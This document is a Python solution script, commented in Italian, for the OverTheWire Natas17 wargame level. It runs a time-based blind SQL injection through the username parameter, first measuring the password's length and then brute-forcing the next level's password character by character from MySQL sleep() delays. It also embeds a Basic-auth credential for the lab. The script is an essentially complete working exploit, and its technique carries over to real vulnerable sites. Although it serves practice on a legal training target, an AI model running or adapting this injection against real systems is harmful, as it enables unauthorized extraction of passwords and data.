''' 
Solution-Script for Natas17 - OverTheWire

Daruma's_eye
'''
from string import ascii_letters
from string import digits
from time import sleep
from time import time
from requests import get                # ==>  per fare richieste get
from urllib.parse import quote          # ==>  per fare codificare l'injection in codifica URL 
alpha_numeric  = ascii_letters + digits
delay          = 0.1
sleep_sec      = 1

#Header delle richieste get, viene usato il campo Auth per accdere al sito tramite password,
#   il valore è un base64 dell'utente e della password
header={'Host'         : 'natas17.natas.labs.overthewire.org'\
       ,'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='}


#Nella prima parte si applica la query { natas18" and if(password like '___' , sleep(1), 0); # } 
#   al campo username per stimare la lunghezza della password, si utlizza elapsed.seconds per
#   confrontarlo con il tempo dello sleep mysql nell'injection
incomplete_injection = 'natas18" and if(password like \''

password_length = 0
while True:

    password_length += 1
    incomplete_injection = incomplete_injection + '_'
    injection = incomplete_injection + '\', sleep(' +str( sleep_sec )+ '), 0); # '
    print( 'Testing password of '+str( password_length )+' chars: with '+injection )
    
    injection = quote( injection,safe= '')
    url = 'http://natas17.natas.labs.overthewire.org/?username='+ injection
    
    req = get( url, headers= header )    

    #Potrebbe succedere che a causa di ritardi nella rete una richiesta impieghi più tempo del previsto
    #   per sicurezza viene effettuata una seconda prova
    if( req.status_code == 200 ):
        if( req.elapsed.seconds >= sleep_sec ):
            
            print( 'Request produced http_code 200 in ' +str( req.elapsed.seconds )+ ' secs > ' +str( sleep_sec )+ '\nRetesting in 1 sec...')
            sleep ( 1 )

            req = get( url , headers= header )
            if( req.elapsed.seconds >= sleep_sec ):
                break
            
    else:
        print('########## HTTP ERROR: ' +str( req.status_code )+ '##########\nRetrying...')
        incomplete_injection = incomplete_injection[ 0:len( incomplete_injection )-1]

    sleep( delay )

print( 'It seems that the password is '+str( password_length )+' chars long.\nWe can proceed with bruteforcing...' )

sleep( 0.5 )


#Nella seconda parte si si applica la query { natas18" and if(password like '%' , sleep(1), 0); # } 
#   come nella prima parte ma in questo caso si fa il bruteforcing carattere per carattere 
password=''
i=0
while( i < password_length ):
    
    for char in alpha_numeric:
        
        print( 'Testing char '+ char +' for position '+ str(i) )
        injection = 'natas18" and if(password like binary \'' + password + char
        
        if( i!= password_length -1 ):
            injection = injection +'%'
        injection = injection +'\', sleep(' +str( sleep_sec )+ '), 0); # ' 
        print( 'Testing '+injection )

        injection = quote( injection,safe='' )        
	    url = 'http://natas17.natas.labs.overthewire.org/?username=' +injection
        
	    req = get( url, headers= header )


        if( req.status_code==200 ):
            if( req.elapsed.seconds >= sleep_sec ):

                #Potrebbe succedere che a causa di ritardi nella rete una richiesta impieghi più tempo del previsto
                #   per sicurezza viene effettuata una seconda prova
                print( 'Request produced http_code 200 in ' +str( req.elapsed.seconds )+ ' secs > ' +str( sleep_sec )+ '\nRetesting in 0.5 sec...' )
                sleep(.5)
                req  = get( url, headers= header )
                if( req.elapsed.seconds >= sleep_sec ):
                    password = password+char
                    print( 'The char of position '+ str(i) +' is : '+ char )
                    break
            

            #Nel caso in cui non si trova una corrispondenza finendo i caratteri a disposizione
            #   si ipotizza che ci sia stato un problema con la richiesta e quindi si decrementa
            #   la i per riprovare la posizione che ha fallito
            elif( char == '9' ):

                i-= 1
                break
            
        else:

            print( '########## HTTP ERROR: ' +str( req.status_code )+ '##########\nRetrying...' )
            password = password[ 0:len( password )-1 ]
            i=i-1
            break

        sleep( delay )

    i+= 1

print( 'We have the password! Here it is: '+password )
